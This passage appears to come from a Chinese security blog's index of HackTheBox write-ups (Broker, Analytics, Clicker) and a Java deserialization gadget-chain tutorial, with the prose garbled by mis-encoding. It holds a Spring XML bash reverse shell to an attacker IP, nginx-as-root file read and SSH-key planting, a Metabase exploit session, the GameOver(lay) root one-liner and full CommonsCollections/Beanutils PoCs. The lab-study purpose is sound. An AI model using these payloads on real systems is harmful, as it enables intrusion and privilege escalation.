xsi:schemaLocation=&quot; http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.17/5555 0&amp;gt;&amp;amp;1&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt; &lt;/beans&gt; ä¸ºäº†èƒ½ä½¿ç›®æ ‡æœºå¯ä»¥è®¿é—®åˆ°poc.xmlï¼Œæˆ‘åœ¨æœ¬åœ°å¼€å¯äº†nginxæœåŠ¡ï¼Œå¹¶ä¸”ç›‘å¬80ç«¯å£ å¯åŠ¨nc 1nc -lnnp 5555 ä½¿ç”¨pocå®æ–½RCE 1python3 exploit.py -i 10.10.11.243 -p 61616 -u http://10.10.16.17/poc.xml å¾—åˆ°activemqç”¨æˆ·çš„shell 12activemq@broker:/home$ iduid=1000(activemq) gid=1000(activemq) groups=1000(activemq) user-rootå¸¸è§„æƒé™æ£€æŸ¥ 12345678910activemq@broker:/home$ sudo -lsudo -lMatching Defaults entries for activemq on broker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser activemq may run the following commands on broker: (ALL : ALL) NOPASSWD: /usr/sbin/nginx activemqç”¨æˆ·å¯ä»¥ä»¥rootæƒé™ä½¿ç”¨nginx æˆ‘å¯ä»¥åˆ¶ä½œä¸€ä¸ªæ¶æ„çš„é…ç½®æ–‡ä»¶ï¼Œuserä¸ºroot;å¹¶ä¸”ä½¿å¾—ç½‘ç«™ç›®å½•ä¸º/ï¼›è¿™æ ·å°±å¯ä»¥è®¿é—®ä»»æ„æ–‡ä»¶äº† 1234567891011user root;events { worker_connections 1024;}http { server { listen 1337; root /; autoindex on; }} å†ç”¨nginxçš„-cå‚æ•°æŒ‡å®šé…ç½®æ–‡ä»¶ 1sudo /usr/sbin/nginx -c /home/activemq/shell.config netstat -ltunpå‘ç°ç«¯å£1337å·²ç»åœ¨ç›‘å¬çŠ¶æ€ 123â”Œâ”€â”€(kaliã‰¿kali)-[/var/log/nginx]â””â”€$ curl http://10.10.11.243:1337/root/root.txt5f68e0f2578b1608db7db4ffa55bba46 é™¤äº†æ–‡ä»¶è¯»å–ï¼›nginx è¿˜å¯ä»¥å¤„ç†å†™å…¥æ–‡ä»¶çš„ PUT è¯·æ±‚ã€‚æˆ‘å°†æ›´æ–°é…ç½®ä»¥åŒ…æ‹¬å¯ç”¨ PUT 123456789101112user root;events { worker_connections 1024;}http { server { listen 1338; root /; autoindex on; dav_methods PUT; }} å°†æˆ‘çš„å…¬å…± SSH å¯†é’¥å†™å…¥ root çš„authorized_keysæ–‡ä»¶ä¸­ 1curl -X PUT localhost:1338/root/.ssh/authorized_keys -d 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing' æ¥ç€åˆ©ç”¨ç§é’¥ sshè¿æ¥å³å¯","link":"/2024/01/27/Broker(HTB)/"},{"title":"Analytics(HTB)","text":"ä¿¡æ¯æœé›†1234567891011sudo nmap -p- -min-rate 10000 10.10.11.233[sudo] kali çš„å¯†ç ï¼šStarting Nmap 7.94 ( https://nmap.org ) at 2024-01-01 13:44 CSTNmap scan report for analytical.htb (10.10.11.233)Host is up (0.12s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 7.20 seconds /etc/hosts 1210.10.11.233 analytical.htb10.10.11.233 data.analytical.htb user-metabaseå‘ç° Metabase æœ‰ä¸€ä¸ªæœ€è¿‘æŠ«éœ²çš„é¢„èº«ä»½éªŒè¯ RCE æ¼æ´;CVE-2023-38646 è¯¥ç³»ç»Ÿåœ¨0.46.6.1ä¹‹å‰çš„å¼€æºç‰ˆæœ¬å’Œ1.46.6.1ä¹‹å‰çš„ä¼ä¸šç‰ˆæœ¬ä¸­å­˜åœ¨æ¼æ´ã€‚ /api/session/propertiesï¼ˆæ— éœ€æˆæƒä¹Ÿå¯è®¿é—®ï¼‰æ³„éœ²setup-tokenï¼› æˆ‘è¿™é‡Œç›´æ¥ç”¨msfï¼› 12345678910111213141516171819202122232425262728293031323334â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ msfconsolemsf6 &gt; search metabaseMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/linux/http/metabase_setup_token_rce 2023-07-22 excellent Yes Metabase Setup Token RCEInteract with a module by name or index. For example info 0, use 0 or use exploit/linux/http/metabase_setup_token_rce msf6 &gt; use 0[*] Using configured payload cmd/unix/reverse_bashmsf6 exploit(linux/http/metabase_setup_token_rce) &gt; set rhost http://data.analytical.htb/rhost =&gt; http://data.analytical.htb/msf6 exploit(linux/http/metabase_setup_token_rce) &gt; set lhost 10.10.16.5lhost =&gt; 10.10.16.5msf6 exploit(linux/http/metabase_setup_token_rce) &gt; set rport 80rport =&gt; 80msf6 exploit(linux/http/metabase_setup_token_rce) &gt; run[*] Started reverse TCP handler on 10.10.16.5:4444 [*] Running automatic check (&quot;set AutoCheck false&quot; to disable)[+] The target appears to be vulnerable. Version Detected: 0.46.6[+] Found setup token: 249fa03d-fd94-4d5b-b94f-b4ebf3df681f[*] Sending exploit (may take a few seconds)[*] Command shell session 1 opened (10.10.16.5:4444 -&gt; 10.10.11.233:49520) at 2024-01-01 13:49:23 +0800 whoami metabase user-metalyticsæ•æ„Ÿä¿¡æ¯è—å¾—æŒºæ·±çš„ï¼Œå±…ç„¶åœ¨ç¯å¢ƒå˜é‡é‡Œé¢ï¼› 1234567891011121314151617181920212223242526272829env MB_LDAP_BIND_DN= LANGUAGE=en_US:en USER=metabase HOSTNAME=f119c1f252f8FC_LANG=en-USSHLVL=5LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../libHOME=/home/metabaseMB_EMAIL_SMTP_PASSWORD=LC_CTYPE=en_US.UTF-8JAVA_VERSION=jdk-11.0.19+7LOGNAME=metabase_=/bin/shMB_DB_CONNECTION_URI=PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binMB_DB_PASS=MB_JETTY_HOST=0.0.0.0META_PASS=An4lytics_ds20223#LANG=en_US.UTF-8MB_LDAP_PASSWORD=SHELL=/bin/shMB_EMAIL_SMTP_USERNAME=MB_DB_USER=META_USER=metalyticsLC_ALL=en_US.UTF-8JAVA_HOME=/opt/java/openjdkPWD=/MB_DB_FILE=//metabase.db/metabase.db ä¸­å‘ç° 12META_USER=metalyticsMETA_PASS=An4lytics_ds20223# sshç™»é™†æˆåŠŸ 12ssh metalytics@10.10.11.233 An4lytics_ds20223# user-rootsudo -læ²¡æœ‰åˆ©ç”¨ç‚¹123metalytics@analytics:~$ sudo -l[sudo] password for metalytics: Sorry, user metalytics may not run sudo on localhost. suidæ²¡æœ‰åˆ©ç”¨ç‚¹123456789101112131415metalytics@analytics:~$ find / -perm -4000 2&gt;/dev/null/var/tmp/bash/usr/bin/newgrp/usr/bin/gpasswd/usr/bin/su/usr/bin/umount/usr/bin/chsh/usr/bin/fusermount3/usr/bin/sudo/usr/bin/passwd/usr/bin/mount/usr/bin/chfn/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/libexec/polkit-agent-helper-1 uname -a1Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux ä½¿ç”¨ CVE-2023-2640 å’Œ CVE-2023-32629 è·å–é Root å®¹å™¨çš„ Root æƒé™ï¼Œåˆå GameOver(lay) payloadåªæœ‰ä¸€è¡Œ 1unshare -rm sh -c &quot;mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;&quot; &amp;&amp; u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn(&quot;/bin/bash&quot;)' Vulnerable kernels Kernel version Ubuntu release 6.2.0 Ubuntu 23.04 (Lunar Lobster) / Ubuntu 22.04 LTS (Jammy Jellyfish) 5.19.0 Ubuntu 22.10 (Kinetic Kudu) / Ubuntu 22.04 LTS (Jammy Jellyfish) 5.4.0 Ubuntu 22.04 LTS (Local Fossa) / Ubuntu 18.04 LTS (Bionic Beaver) æ€»ç»“è€å¿ƒï¼ŒåšæŒï¼Œç ”ç©¶å’ŒæŠ€æœ¯æŠ€èƒ½çš„ç»“åˆè®©æˆ‘å®ç°äº†ç›®æ ‡ã€‚","link":"/2024/01/01/Analytics(HTB)/"},{"title":"CC4+CC2+CB","text":"CommonsCollections4CC4ä¸å†æ˜¯é€šè¿‡TransformedMap.checkSetValueæ–¹æ³•è°ƒç”¨åˆ°ChainedTransformer.transform;è€Œæ˜¯é€šè¿‡TransformingComparator.compareè°ƒç”¨çš„ChainedTransformer.transform; CC4æ˜¯åœ¨commons-collections4-4.0ä¸­çš„é“¾ï¼Œå› ä¸ºTransformingComparatorç±»åœ¨commons-collections4-4.0.jarä¸­å®ç°äº†Serializableæ¥å£ï¼Œè€Œåœ¨commons-collections3ä¸­TransformingComparatorç±»æ²¡æœ‰å®ç°Serializableæ¥å£ï¼› å¯ä»¥çœ‹åˆ°TransformingComparatorä¸­çš„compareè°ƒç”¨äº†transformæ–¹æ³•ï¼Œè€Œä¸”transformeræ˜¯å¯æ§çš„ 12345678910public TransformingComparator(final Transformer&lt;? super I, ? extends O&gt; transformer, final Comparator&lt;O&gt; decorated) { this.decorated = decorated; this.transformer = transformer;} public int compare(final I obj1, final I obj2) { final O value1 = this.transformer.transform(obj1); final O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2);} CC4çš„å…¥å£ç±»æ˜¯PriorityQueue,å› ä¸ºPriorityQueueçš„readObjecté—´æ¥è°ƒç”¨äº†compare;è€Œä¸”è°ƒç”¨compareçš„å¯¹è±¡å¯æ§ï¼› readObject() == &gt; heapify() 123456789101112private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); s.readInt(); queue = new Object[size]; for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); heapify();} æ³¨æ„ï¼šsize &gt;&gt;&gt; 1æ˜¯ä¸€ä¸ªä½è¿ç®—æ“ä½œï¼Œç”¨äºå°†ä¸€ä¸ªæ•°å€¼å‘å³ä½ç§»1ä½ï¼Œç›¸å½“äºé™¤ä»¥2å–æ•´çš„æ“ä½œã€‚å¦‚æœè¦ç¬¦åˆi &gt;= 0çš„æ¡ä»¶ï¼Œsizeæœ€å…ˆè¦ä¸º2ï¼›ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨åˆ›å»ºPriorityQueueå¯¹è±¡æ—¶ï¼Œè‡³å°‘è¦addä¸¤æ¬¡(å…¶å®åå°„ä¿®æ”¹sizeå±æ€§å€¼ä¹Ÿæ˜¯å¯ä»¥çš„)ï¼Œä½¿å¾—sizeçš„å€¼ä¸º2ï¼Œæ‰ä¼šè°ƒç”¨åˆ°siftDownï¼Œ 1234private void heapify() { for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]);} 123456private void siftDown(int k, E x) { if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x);} æœ€ååœ¨siftDownUsingComparatorä¸­è°ƒç”¨äº†comparator.compare; 12345678910111213141516private void siftDownUsingComparator(int k, E x) { int half = size &gt;&gt;&gt; 1; while (k &lt; half) { int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; } queue[k] = x;} è¿˜éœ€è¦æ³¨æ„ä¸€ä¸‹PriorityQueueçš„addæ–¹æ³• 123public boolean add(E e) { return offer(e);} å½“ç¬¬äºŒæ¬¡addæ•°æ®æ—¶ï¼Œiä¸ç­‰äº0ï¼›ä¼šè°ƒç”¨elseä¸­çš„siftUp 1234567891011121314public boolean offer(E e) { if (e == null) throw new NullPointerException(); modCount++; int i = size; if (i &gt;= queue.length) grow(i + 1); size = i + 1; if (i == 0) queue[0] = e; else siftUp(i, e); return true;} 123456private void siftUp(int k, E x) { if (comparator != null) siftUpUsingComparator(k, x); else siftUpComparable(k, x);} æœ€ååœ¨siftUpUsingComparatoræ–¹æ³•ä¸­ä¹Ÿä¼šè°ƒç”¨compareæ–¹æ³•ï¼Œå’ŒCC6ä¸€æ ·ï¼Œå¦‚æœä¸åšä¿®æ”¹çš„è¯ï¼Œä¼šåœ¨åºåˆ—åŒ–æ—¶å°±ä¼šè°ƒç”¨ï¼› æ‰€ä»¥éœ€è¦åœ¨åºåˆ—åŒ–æ—¶ä¿®æ”¹ä¸€ä¸‹comparatorçš„å€¼ï¼Œè°ƒç”¨å®Œaddæ–¹æ³•ä¹‹åï¼Œå†é€šè¿‡åå°„ä¿®æ”¹å›æ¥ 1234567891011private void siftUpUsingComparator(int k, E x) { while (k &gt; 0) { int parent = (k - 1) &gt;&gt;&gt; 1; Object e = queue[parent]; if (comparator.compare(x, (E) e) &gt;= 0) break; queue[k] = e; k = parent; } queue[k] = x;} poc: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package demo1;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class Test8 { public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException { TemplatesImpl templates = new TemplatesImpl(); Class&lt;? extends TemplatesImpl&gt; tCalss = templates.getClass(); Field name = tCalss.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;deadbeef&quot;);// Field tfactory = tCalss.getDeclaredField(&quot;_tfactory&quot;);// tfactory.setAccessible(true);// tfactory.set(templates,new TransformerFactoryImpl()); byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;)); byte[][] codes = {bytes}; Field bytecodes = tCalss.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates,codes); Transformer[] transformers = { new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;, null, null) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(1); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(&quot;transformer&quot;); transformerField.setAccessible(true); transformerField.set(transformingComparator,chainedTransformer); serialize(priorityQueue); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); ois.close(); }} CommonsCollections2CC2æ˜¯åœ¨commons-collections4-4.0ä¸­çš„ 12345public int compare(final I obj1, final I obj2) { final O value1 = this.transformer.transform(obj1); final O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2);} åœ¨TransformingComparatorç±»ä¸­ï¼Œcompareæ–¹æ³•çš„obj1æ˜¯å¯æ§çš„ï¼Œå¯ä»¥åœ¨ä¸Šé¢çš„æºç ä¸­çœ‹åˆ°ï¼Œobj1å…¶å®å°±æ˜¯PriorityQueueç±»ä¸­çš„åœ¨è°ƒç”¨readObjectæ—¶çš„heapifyæ–¹æ³•çš„queue[i]çš„å€¼ï¼Œè¿™ä¸ªå€¼å°±æ˜¯æˆ‘ä»¬addçš„æ•°æ®ï¼Œå¦‚æœæˆ‘addçš„æ˜¯templates;æˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨InvokerTransformer;å°±ä¸ç”¨ChainedTransformerçš„æ•°ç»„åµŒå¥—è°ƒç”¨äº† 1new InvokerTransformer(&quot;newTransformer&quot;, null, null).transform(templates) è™½ç„¶queueæ•°ç»„è¢«transientä¿®é¥°äº†ï¼Œä½†æ˜¯åœ¨writeObjectå‡½æ•°ä¸­é€šè¿‡s.writeObject(queue[i]); æ¥åºåˆ—åŒ– queue æ•°ç»„çš„å…ƒç´ ã€‚è€Œä¸æ˜¯æŠŠqueueå½“ä½œä¸€ä¸ªObjectæ•°ç»„å­˜è´®ï¼›æ‰€ä»¥queueçš„æ•°æ®è¿˜æ˜¯ä¼šè¢«åºåˆ—åŒ–ï¼Œ 1transient Object[] queue; 123456789private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException { s.defaultWriteObject(); s.writeInt(Math.max(2, size + 1)); for (int i = 0; i &lt; size; i++) s.writeObject(queue[i]);} poc 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package demo1;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections4.comparators.TransformingComparator;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import java.io.*;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class Test8 { public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException { TemplatesImpl templates = new TemplatesImpl(); Class&lt;? extends TemplatesImpl&gt; tCalss = templates.getClass(); Field name = tCalss.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;deadbeef&quot;); byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;)); byte[][] codes = {bytes}; Field bytecodes = tCalss.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates,codes); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(templates); priorityQueue.add(2); Class c = transformingComparator.getClass(); Field transformerField = c.getDeclaredField(&quot;transformer&quot;); transformerField.setAccessible(true); transformerField.set(transformingComparator,invokerTransformer); serialize(priorityQueue); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); ois.close(); }} CommonsBeanutilsCommonsBeanutils æ˜¯åº”ç”¨äº javabean çš„å·¥å…·ï¼Œå®ƒæä¾›äº†å¯¹æ™®é€šJavaç±»å¯¹è±¡ï¼ˆä¹Ÿç§°ä¸ºJavaBeanï¼‰çš„ä¸€äº›æ“ä½œæ–¹æ³• æ‰€è°“javaBeanï¼Œæ˜¯æŒ‡ç¬¦åˆå¦‚ä¸‹æ ‡å‡†çš„Javaç±»ï¼š ç±»æ˜¯å…¬å…±çš„ æœ‰ä¸€ä¸ªæ— å‚çš„å…¬å…±çš„æ„é€ å™¨ æœ‰ç§æœ‰å±æ€§ï¼Œä¸”é¡»æœ‰å¯¹åº”çš„getã€setæ–¹æ³•å»è®¾ç½®å±æ€§ å¯¹äºbooleanç±»å‹çš„æˆå‘˜å˜é‡ï¼Œå…è®¸ä½¿ç”¨â€isâ€ä»£æ›¿ä¸Šé¢çš„â€getâ€å’Œâ€setâ€ åˆ›å»ºJavabeanç±» 12345678910111213141516171819202122232425262728293031public class Student { private String name; private int age; public Student() {} public Student(String name, int age) { this.name = name; this.age = age; } public String getName() { System.out.println(&quot;æ‰§è¡ŒgetName&quot;); return name; } public void setName(String name) { System.out.println(&quot;æ‰§è¡ŒsetName&quot;); this.name = name; } public int getAge() { System.out.println(&quot;æ‰§è¡ŒgetAge&quot;); return age; } public void setAge(int age) { System.out.println(&quot;æ‰§è¡ŒsetAge&quot;); this.age = age; }} åˆ›å»ºæµ‹è¯•ç±» 1234567891011121314import org.apache.commons.beanutils.PropertyUtils;import java.lang.reflect.InvocationTargetException;public class Test { public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException { Student stu = new Student(&quot;zIxyd&quot;, 20); //ç¬¬ä¸€ä¸ªå‚æ•°ä¸º JavaBean å®ä¾‹ï¼Œç¬¬äºŒä¸ªæ˜¯ JavaBean çš„å±æ€§ Object name = PropertyUtils.getProperty(stu, &quot;name&quot;); System.out.println(name); }}//æ‰§è¡ŒgetName//zIxyd TemplatesImplç±»ä¸‹çš„getOutputPropertiesæ–¹æ³•ä¹Ÿç¬¦åˆJavabeançš„ç‰¹ç‚¹; è€Œä¸”getOutputPropertiesæ–¹æ³•è°ƒç”¨äº†newTransformeræ–¹æ³•ï¼Œå¦‚æœå’ŒCC2-4ä¸€æ ·ï¼Œè°ƒç”¨æ¶æ„çš„TemplatesImplå®ä¾‹çš„çš„newTransformeræ–¹æ³•å¯ä»¥ä»»æ„ç±»åŠ è½½å¹¶ä¸”å®ä¾‹åŒ–ï¼Œå°±å¯ä»¥ä»»æ„ä»£ç æ‰§è¡Œäº† 12345678public synchronized Properties getOutputProperties() { try { return newTransformer().getOutputProperties(); // &lt;== } catch (TransformerConfigurationException e) { return null; } } æ¥ç€çœ‹çœ‹é‚£é‡Œè°ƒç”¨äº†getPropertyæ–¹æ³•ï¼› å…¶ä¸­BeanComparatorç±»ä¸‹çš„compareæ–¹æ³•è°ƒç”¨äº†PropertyUtils.getProperty( o1, property );;è€Œä¸”å½¢å‚propertyæ˜¯å¯ä»¥é€šè¿‡æ„é€ å‡½æ•°æ§åˆ¶ï¼Œå½¢å‚o1ä¹Ÿæ˜¯å¯æ§çš„ï¼› ç„¶åå°±ç”¨CC4å’ŒCC2ä¸­çš„PriorityQueueä¸­readObjectä¼šè°ƒç”¨compareæ–¹æ³•ï¼Œè¿™æ ·å°±ä¸²èµ·æ¥äº† 1234567891011public int compare( Object o1, Object o2 ) { if ( property == null ) { // compare the actual objects return comparator.compare( o1, o2 ); } try { Object value1 = PropertyUtils.getProperty( o1, property ); Object value2 = PropertyUtils.getProperty( o2, property ); ...... ç›´æ¥æ‰§è¡Œæ¶æ„templateså®ä¾‹çš„getOutputPropertiesæ–¹æ³• 123456789101112131415161718TemplatesImpl templates = new TemplatesImpl();Class&lt;? extends TemplatesImpl&gt; tCalss = templates.getClass();Field name = tCalss.getDeclaredField(&quot;_name&quot;);name.setAccessible(true);name.set(templates,&quot;deadbeef&quot;);Field tfactory = tCalss.getDeclaredField(&quot;_tfactory&quot;);tfactory.setAccessible(true);tfactory.set(templates,new TransformerFactoryImpl());byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;));byte[][] codes = {bytes};Field bytecodes = tCalss.getDeclaredField(&quot;_bytecodes&quot;);bytecodes.setAccessible(true);bytecodes.set(templates,codes);PropertyUtils.getProperty(templates,&quot;outputProperties&quot;); pco 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.beanutils.BeanComparator;import org.apache.commons.collections.comparators.TransformingComparator;import org.apache.commons.collections.functors.ConstantTransformer;import java.io.*;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.nio.file.Files;import java.nio.file.Paths;import java.util.PriorityQueue;public class Test1 { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException { TemplatesImpl templates = new TemplatesImpl(); Class&lt;? extends TemplatesImpl&gt; tCalss = templates.getClass(); Field name = tCalss.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;deadbeef&quot;); byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;)); byte[][] codes = {bytes}; Field bytecodes = tCalss.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates,codes); BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;, null); TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue(transformingComparator); priorityQueue.add(templates); priorityQueue.add(2); Class c = priorityQueue.getClass(); Field comparator = c.getDeclaredField(&quot;comparator&quot;); comparator.setAccessible(true); comparator.set(priorityQueue,beanComparator); serialize(priorityQueue); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); ois.close(); }}","link":"/2024/02/29/CC4+CC2/"},{"title":"Clicker(HTB)","text":"ä¿¡æ¯æœé›†nmap12345678910sudo nmap -p- -sT -min-rate 4000 10.10.11.232PORT STATE SERVICE22/tcp open ssh80/tcp open http111/tcp open rpcbind2049/tcp open nfs8000/tcp open http-alt36831/tcp open unknown41197/tcp open unknown59535/tcp open unknown NSFæ³„éœ²å¤‡ä»½æ–‡ä»¶2049/tcp open nfs NFSæ˜¯network file systemç¼©å†™ï¼Œç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œç”¨æ¥æŒ‚åœ¨æŸä¸ªç›®å½•æˆ–æ–‡ä»¶è¿›è¡Œå…±äº«ï¼Œé»˜è®¤æ˜¯2049ç«¯å£ï¼ŒåŠŸèƒ½ç±»ä¼¼äºwindowsçš„å…±äº«,ä»¥é€šè¿‡showmountå‘½ä»¤æ¥åˆ—å‡ºç›®æ ‡æœºçš„å…±äº«ç›®å½•ï¼Œeå‚æ•°æ˜¾ç¤ºNFSæœåŠ¡å™¨çš„è¾“å‡ºæ¸…å•ã€‚ 123456789101112â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ showmount -e 10.10.11.232 Export list for 10.10.11.232:/mnt/backups *#/mnt/backupsç›®å½•è¢«ä»¥åªè¯»æ–¹å¼ï¼ˆ*ï¼‰å…±äº«å‡ºæ¥ï¼Œè¿™æ„å‘³ç€å…¶ä»–ä¸»æœºå¯ä»¥é€šè¿‡NFSåè®®æŒ‚è½½è¿™ä¸ªç›®å½•ï¼Œå¹¶ä¸”åªèƒ½ä»¥åªè¯»æ–¹å¼è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ã€‚sudo mount -t nfs 10.10.11.232:/mnt/backups /tmp/clickersudo cp ./clicker.htb_backup.zip /home/kaliunzip clicker.htb_backup.zip 1234567891011121314151617æ€»è®¡ 64-rw-rw-r-- 1 kali kali 3934 9æœˆ 2æ—¥ 04:18 admin.phpdrwxr-xr-x 4 kali kali 4096 2023å¹´ 2æœˆ28æ—¥ assets-rw-rw-r-- 1 kali kali 608 9æœˆ 2æ—¥ 04:17 authenticate.php-rw-rw-r-- 1 kali kali 541 9æœˆ 2æ—¥ 04:17 create_player.php-rw-rw-r-- 1 kali kali 2536 9æœˆ 2æ—¥ 04:18 db_utils.php-rw-r--r-- 1 kali kali 1376 9æœˆ 2æ—¥ 04:18 diagnostic.php-rw-rw-r-- 1 kali kali 1977 9æœˆ 2æ—¥ 04:18 export.phpdrwxr-xr-x 2 kali kali 4096 9æœˆ 2æ—¥ 04:18 exports-rw-rw-r-- 1 kali kali 3887 9æœˆ 2æ—¥ 04:18 index.php-rw-rw-r-- 1 kali kali 3423 9æœˆ 2æ—¥ 04:18 info.php-rw-rw-r-- 1 kali kali 3301 9æœˆ 2æ—¥ 04:18 login.php-rw-rw-r-- 1 kali kali 74 9æœˆ 2æ—¥ 04:17 logout.php-rw-rw-r-- 1 kali kali 3341 9æœˆ 2æ—¥ 04:17 play.php-rw-rw-r-- 1 kali kali 3070 9æœˆ 2æ—¥ 04:17 profile.php-rw-rw-r-- 1 kali kali 3333 9æœˆ 2æ—¥ 04:18 register.php-rw-rw-r-- 1 kali kali 563 9æœˆ 2æ—¥ 04:18 save_game.php è´´å‡ ä¸ªéœ€è¦åˆ©ç”¨çš„æ–‡ä»¶ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091#db_utils.php&lt;?phpsession_start();$db_server=&quot;localhost&quot;;$db_username=&quot;clicker_db_user&quot;;$db_password=&quot;clicker_db_password&quot;;$db_name=&quot;clicker&quot;;$mysqli = new mysqli($db_server, $db_username, $db_password, $db_name);$pdo = new PDO(&quot;mysql:dbname=$db_name;host=$db_server&quot;, $db_username, $db_password);function check_exists($player) 